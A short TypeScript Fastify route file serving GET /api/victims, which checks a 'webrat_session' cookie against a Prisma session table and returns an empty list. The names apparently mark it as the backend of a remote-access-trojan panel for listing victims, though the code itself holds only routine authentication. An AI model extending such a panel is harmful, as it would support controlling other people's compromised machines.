import type { FastifyPluginAsync } from "fastify";

import { prisma } from "../prisma";

export const victimsRoutes: FastifyPluginAsync = async (app) => {
  app.get("/api/victims", async (req, reply) => {
    const sid = req.cookies.webrat_session;
    if (!sid) {
      return reply.code(401).send({ error: "unauthorized" });
    }

    const session = await prisma.session.findUnique({
      where: { id: sid },
      select: { id: true, expiresAt: true, userId: true },
    });

    if (!session) {
      return reply.code(401).send({ error: "unauthorized" });
    }

    if (session.expiresAt.getTime() <= Date.now()) {
      await prisma.session.delete({ where: { id: sid } }).catch(() => undefined);
      return reply.code(401).send({ error: "unauthorized" });
    }

    return reply.send([]);
  });
};